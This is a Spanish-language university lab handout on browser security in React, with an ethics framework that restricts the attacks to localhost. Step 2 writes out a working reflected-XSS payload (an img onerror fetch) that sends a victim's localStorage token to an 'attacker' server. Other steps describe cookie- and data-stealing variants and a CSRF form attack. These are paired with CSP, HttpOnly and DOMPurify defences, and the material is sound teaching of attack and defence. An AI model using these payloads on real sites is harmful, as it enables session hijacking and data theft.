# Práctica - S04 - Autenticación y seguridad en el navegador

**React en producción con TypeScript**
**Duración:** 80 minutos, por equipo.

---

## Marco legal y ético: léelo antes de teclear

Esta práctica incluye un ataque de **XSS** y uno de **CSRF**. Se hacen **solo** contra el laboratorio de esta carpeta: un servidor y una página de ejemplo en `127.0.0.1`, y un "atacante" que es otro puerto de tu propia computadora.

- Nada de esto se prueba contra un sistema que no sea tuyo o sin la **autorización por escrito** de su dueño.
- En México, el acceso sin autorización a sistemas y equipos de informática está tipificado como delito en el Código Penal Federal (arts. 211 bis 1 a 211 bis 7; texto vigente en el sitio de la Cámara de Diputados).
- Los datos del laboratorio (correo, contraseña, tickets) son **inventados**: **Ejemplo ilustrativo**.
- El propósito es defender: demostrar que tu defensa funciona.

Marca esta casilla en `evidencia-s04.md` antes de seguir: *"Entiendo que estas pruebas son solo contra mi laboratorio local."*

---

## Objetivo

1. **Robar** un token de `localStorage` con un XSS reflejado.
2. Ver cómo una cookie `HttpOnly` impide el robo, y **ver también lo que no impide**.
3. Ver cómo una **CSP** bloquea la inyección y, en una segunda capa, la salida de los datos.
4. Ver tres experimentos de **CSRF** y qué defensa detiene cada uno.
5. Probar DOMPurify y la política de React frente a un XSS.

---

## Antes de empezar

Versiones a noviembre de 2026: Node 22.22 o superior, React 19.3.1, DOMPurify 3.4.17, Vite 8.3.8, Playwright 1.65 (Chromium 158 en el momento de escribir esto).

```bash
cd referencia/mesa-de-ayuda
npm install
npx playwright install chromium     # una vez; en Linux sin permisos de administrador, pide ayuda al instructor
npm run build
```

Tres terminales:

```bash
# Terminal 1: la API y el front construido, con el laboratorio
PORT=3110 node server/server.mjs

# Terminal 2: el "atacante" de laboratorio
PORT=3119 node lab/atacante.mjs

# Terminal 3: tus comandos
```

---

## Paso 1 - Confirmar que el laboratorio solo escucha en tu máquina

```bash
ss -ltn | grep -E ':(3110|3119)\b'
```

Salida real:

```text
LISTEN 0      511                                127.0.0.1:3119       0.0.0.0:*
LISTEN 0      511                                127.0.0.1:3110       0.0.0.0:*
```

Las dos direcciones son `127.0.0.1`: ninguna otra máquina puede conectarse. Si ves `0.0.0.0` o `*`, **detén el servidor** y revisa; no continúes.

Mira la página vulnerable en el navegador (`http://127.0.0.1:3110/lab/vulnerable.html`) y lee `lab/vulnerable.js`. Anota en tu evidencia los **dos defectos** que tiene, con el número de línea.

---

## Paso 2 - Robar un token de `localStorage`

El atacante necesita una dirección que la víctima abra. Es un enlace con la carga en `?q=`:

```text
http://127.0.0.1:3110/lab/vulnerable.html?q=<img src=x onerror="fetch('http://127.0.0.1:3119/robo?token='+encodeURIComponent(localStorage.getItem('token')))">
```

Lo ejecuta, en un navegador real, el script del laboratorio. Entra con el token en `localStorage`, abre el enlace y espera:

```bash
node lab/probar-xss.mjs token
```

En la terminal del atacante (o en `lab/atacante.mjs` si lo corriste con salida a archivo) aparece **la prueba del robo**. Salida real:

```text
estado: Sesión con token en localStorage
[consola] Failed to load resource: the server responded with a status of 404 (Not Found)
[atacante] GET /robo?token=t2V-eJl1H2b42vOPbmoIxNj7xqMunN8c
```

(El 404 es de la imagen `src=x`, que no existe: es el truco para disparar `onerror`. El valor del token cambia en cada ejecución.)

Comprueba que el token es **real**: úsalo desde otro lugar, sin cookie, con `Authorization: Bearer`.

```bash
curl -s -H 'authorization: Bearer <el-token-que-recibió-el-atacante>' http://127.0.0.1:3110/api/me
```

```text
{"id":1,"nombre":"Ana Ejemplo","email":"ana@example.com"}
```

El atacante ya es Ana, **desde otra máquina y mientras quiera**. Escribe en la evidencia en qué línea de `vulnerable.js` está el *sink* y cuál es el *source*.

---

## Paso 3 - Verlo fallar (para el atacante): cookie `HttpOnly`

Misma inyección, pero la carga lee `document.cookie`, y la sesión es una cookie `HttpOnly`:

```bash
node lab/probar-xss.mjs cookie
```

```text
estado: Sesión con cookie HttpOnly
[consola] Failed to load resource: the server responded with a status of 404 (Not Found)
[atacante] GET /robo?cookie=
```

`cookie=` vacío. El script inyectado corrió, pero la cookie no es suya.

Y ahora **lo que `HttpOnly` no impide**. La carga ahora hace una petición con la sesión de la víctima y manda la respuesta al atacante:

```bash
node lab/probar-xss.mjs datos
```

El atacante recibe, entre otras cosas (extracto real, URL con los datos codificados):

```text
[atacante] GET /robo?datos=%7B%22datos%22%3A%5B%7B%22id%22%3A1%2C%22titulo%22%3A%22La%20impresora%20del%20piso%202%20no%20responde%22...
```

Decodificado: `{"datos":[{"id":1,"titulo":"La impresora del piso 2 no responde"...`. **Los datos de la víctima salieron**, con la cookie `HttpOnly` intacta.

Responde en tu evidencia:

- ¿Qué se ganó con la cookie `HttpOnly` frente al token de `localStorage`? (Pista: ¿qué puede hacer el atacante **después** de que la víctima cierre la pestaña?)
- ¿Qué se **perdió** de la defensa? ¿Qué falta para que los datos tampoco salgan?

---

## Paso 4 - La CSP bloquea (verlo fallar de nuevo)

Detén el servidor de la terminal 1 y reinícialo con una CSP:

```bash
CSP="default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self'; base-uri 'none'; object-src 'none'; frame-ancestors 'none'" PORT=3110 node server/server.mjs
```

Comprueba que la cabecera está:

```bash
curl -sI http://127.0.0.1:3110/lab/vulnerable.html | grep -i content-security-policy
```

```text
content-security-policy: default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self'; base-uri 'none'; object-src 'none'; frame-ancestors 'none'
```

Repite el robo del paso 2:

```bash
node lab/probar-xss.mjs token
```

```text
estado: Sesión con token en localStorage
[consola] Executing inline event handler violates the following Content Security Policy directive 'script-src 'self''. Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution. Note that hashes do not apply to event handlers, style attributes and javascript: navigations unless the 'unsafe-hashes' keyword is present. The action has been blocked.
[consola] Failed to load resource: the server responded with a status of 404 (Not Found)
```

El atacante **no recibió nada**. Lee el mensaje con atención: es el que vas a ver en tu aplicación cuando una CSP bloquee algo legítimo.

(Es la salida de Chromium 158. El texto exacto depende del navegador y de su versión.)

### Una segunda capa

Ahora una CSP **debilitada a propósito**, que permite el JavaScript en línea pero limita las conexiones:

```bash
CSP="default-src 'self'; script-src 'self' 'unsafe-inline'; connect-src 'self'" PORT=3110 node server/server.mjs
node lab/probar-xss.mjs token
```

El script inyectado **sí corre** esta vez, pero el atacante no recibe nada:

```text
[consola] Connecting to 'http://127.0.0.1:3119/robo?token=...' violates the following Content Security Policy directive: "connect-src 'self'". The action has been blocked.
[consola] Fetch API cannot load http://127.0.0.1:3119/robo?token=.... Refused to connect because it violates the document's Content Security Policy.
```

Responde: ¿qué directiva impidió la salida del dato aunque el script corriera? ¿Por qué se recomienda tener **ambas** (`script-src` sin `unsafe-inline` y `connect-src` acotado)?

Documenta ambos resultados con la salida de tu terminal.

---

## Paso 5 - CSRF: tres experimentos

El "atacante" también sirve una página con un formulario que manda un POST a la API (`http://127.0.0.1:3119/csrf.html`). El script abre una sesión en la víctima y visita esa página en el mismo navegador:

```bash
node lab/probar-csrf.mjs <host-del-atacante>
```

Tres corridas. Para cada una reinicia el servidor de la terminal 1 con la configuración que indica la tabla.

| | Servidor | Host del atacante | Qué cambia |
|---|---|---|---|
| A | `CSRF=off PORT=3110 node server/server.mjs` | `localhost` | Otro **sitio** (`localhost` frente a `127.0.0.1`) |
| B | `CSRF=off PORT=3110 node server/server.mjs` | `127.0.0.1` | Mismo sitio, otro puerto, defensa de la cabecera **apagada** |
| C | `PORT=3110 node server/server.mjs` | `127.0.0.1` | Mismo sitio, defensa **encendida** |

Salidas reales:

```text
== A. otro sitio (localhost), defensa de cabecera apagada
respuesta de la API al formulario del atacante: {"codigo":"sin-sesion","mensaje":"Inicia sesión."}
hay un ticket plantado: false

== B. mismo sitio (127.0.0.1), defensa apagada
respuesta de la API al formulario del atacante: {"id":4,"titulo":"Ticket plantado por otro sitio","prioridad":"alta","estado":"abierto","creadoEn":"2026-11-11T14:16:43.234Z"}
hay un ticket plantado: true

== C. mismo sitio, defensa encendida
respuesta de la API al formulario del atacante: {"codigo":"csrf","mensaje":"Falta la cabecera X-Requested-By."}
hay un ticket plantado: false
```

(En B el `id` y la fecha serán los tuyos.)

Contesta en tu evidencia, con las salidas:

- ¿Qué detuvo el ataque en A? ¿Por qué la respuesta fue `sin-sesion` y no `csrf`?
- En B, ¿por qué la cookie **sí** viajó, si el formulario venía "de otro lado"? (Pista: ¿cuenta el puerto para decidir si algo es del mismo sitio?)
- ¿Qué detuvo el ataque en C? ¿Qué no puede hacer un formulario HTML que sí puede hacer `fetch`?
- ¿Por qué aceptar `text/plain` en el servidor de laboratorio facilita el ataque B? (Lee la sección de la cabecera personalizada de la nota 13.)

Restaura el servidor a su configuración normal (`PORT=3110 node server/server.mjs`).

---

## Paso 6 - React y DOMPurify frente al XSS

Las pruebas ya están escritas: léelas y córrelas.

```bash
npx vitest run src/shared
```

```text
 Test Files  1 passed (1)
      Tests  5 passed (5)
```

Abre `src/shared/ui/html-seguro.test.tsx` y contesta:

- ¿Qué produce React al interpolar `{ataque}`, y qué al usar `dangerouslySetInnerHTML`? Pega la cadena que espera cada prueba.
- ¿Qué sobrevive de `<img src=x onerror="alert(1)"><b>negritas</b><script>alert(2)</script>` después de `HtmlSeguro`?

**Verlo fallar:** en `src/shared/ui/html-seguro.tsx` cambia `DOMPurify.sanitize(html, {...})` por `html` (sin sanitizar) y corre las pruebas:

```bash
npx vitest run src/shared
```

Caen dos pruebas. Salida real (extracto):

```text
 FAIL  ... > HtmlSeguro conserva el formato permitido y quita lo peligroso
Expected: "<div><b>negritas</b></div>"
Received: "<div><img src="x" onerror="alert(1)"><b>negritas</b><script>alert(2)</script></div>"
 FAIL  ... > un href javascript: no sobrevive a la sanitización
Expected: "<div>clic<p>texto</p></div>"
Received: "<div><a href="javascript:alert(1)">clic</a><p>texto</p></div>"
      Tests  2 failed | 3 passed (5)
```

El HTML con `onerror` y el enlace `javascript:` llegan intactos al DOM. Restaura el archivo.

Después, en el **navegador**, agrega temporalmente a una pantalla un `<HtmlSeguro html={...} />` con la carga del paso 2 y comprueba que no dispara nada. Quita el cambio al terminar.

---

## Paso 7 - Un script en línea con hash

```bash
python3 -c "import hashlib,base64,re;c=re.search(r'<script>(.*?)</script>',open('lab/hash.html').read(),re.S).group(1);print('sha256-'+base64.b64encode(hashlib.sha256(c.encode()).digest()).decode())"
```

```text
sha256-YlWwrlpGCFWzWHTa32ZSw2o+wUuCSf9pJ4T5IfCwMa4=
```

Reinicia el servidor con `CSP="script-src 'sha256-YlWwrlpGCFWzWHTa32ZSw2o+wUuCSf9pJ4T5IfCwMa4='"` y corre:

```bash
node lab/probar-hash.mjs
```

```text
título: ejecutado
```

Ahora **edita** `lab/hash.html` (agrega un comentario al script), reinicia con la **misma** política y corre otra vez:

```text
[consola] Executing inline script violates the following Content Security Policy directive 'script-src 'sha256-YlWwrlpGCFWzWHTa32ZSw2o+wUuCSf9pJ4T5IfCwMa4=''. Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution. ...
título: sin ejecutar
```

Restaura el archivo. Responde: ¿por qué un hash es más seguro que `unsafe-inline`?

---

## Paso 8 - La aplicación real corre con la CSP estricta

Con la política estricta del proyecto, corre las pruebas de punta a punta (el servidor lo levanta Playwright, que hereda la variable):

```bash
CSP="default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; connect-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'" PORT=3110 npx playwright test
```

```text
Running 4 tests using 3 workers
  ✓  ... e2e/tickets.spec.ts:3:1 › entrar, crear un ticket y verlo en la lista
  ✓  ... e2e/red-caida.spec.ts:3:1 › con la red caída el formulario conserva lo escrito y, al recargar, el borrador
  ✓  ... e2e/tickets.spec.ts:19:1 › la cookie de sesión no es legible desde JavaScript
  ✓  ... e2e/csp.spec.ts:3:1 › la CSP bloquea un script en línea inyectado
  4 passed
```

La aplicación entera funciona **sin** `unsafe-inline`, y la cuarta prueba demuestra que un script en línea inyectado **no corre**. Sin la variable `CSP`, esa prueba se omite.

---

## Cierre del laboratorio

Detén **todos** los procesos que arrancaste (`Ctrl-C` en cada terminal; no dejes el "atacante" escuchando) y verifica:

```bash
ss -ltn | grep -E ':(3110|3119)\b' || echo "nada escuchando"
```

---

## Entrega

`evidencia-s04.md` con:

- La casilla del marco legal y ético, firmada con tu nombre.
- Pasos 1 a 5 y 7: la salida real de tu máquina y las respuestas a las preguntas.
- Paso 6: la salida de las pruebas, con y sin sanitizar.
- Paso 8: la salida de Playwright con la CSP estricta.
- Una tabla final: *ataque -> defensa que lo detuvo -> evidencia*. Mínimo cinco filas.

## Criterios de evaluación

| Criterio | Peso |
|---|---|
| El robo del token (paso 2) y el bloqueo (paso 4) con salida real | 30 % |
| Las respuestas sobre lo que `HttpOnly` sí y no hace | 20 % |
| Los experimentos de CSRF explicados con la regla de "mismo sitio" y la cabecera | 20 % |
| DOMPurify, con y sin sanitizar | 10 % |
| La tabla final: cada ataque con su defensa y su evidencia | 15 % |
| Se respetó el marco ético: solo laboratorio, procesos cerrados | 5 % |

---

## Fuentes

- MDN, *Using HTTP cookies*; *Content Security Policy (CSP)*; *Cross-Origin Resource Sharing (CORS)*; glosario *Site* (developer.mozilla.org), leídos el 2026-11-11.
- OWASP Cheat Sheet Series: *Cross Site Scripting Prevention*, *Cross-Site Request Forgery Prevention* y *HTML5 Security* (cheatsheetseries.owasp.org), leídos el 2026-11-11.
- React, documentación de componentes comunes (`dangerouslySetInnerHTML`) (react.dev).
- *Web Application Security*, 2.ª ed. (Hoffman, 2023), caps. 10, 11, 28 y 29.
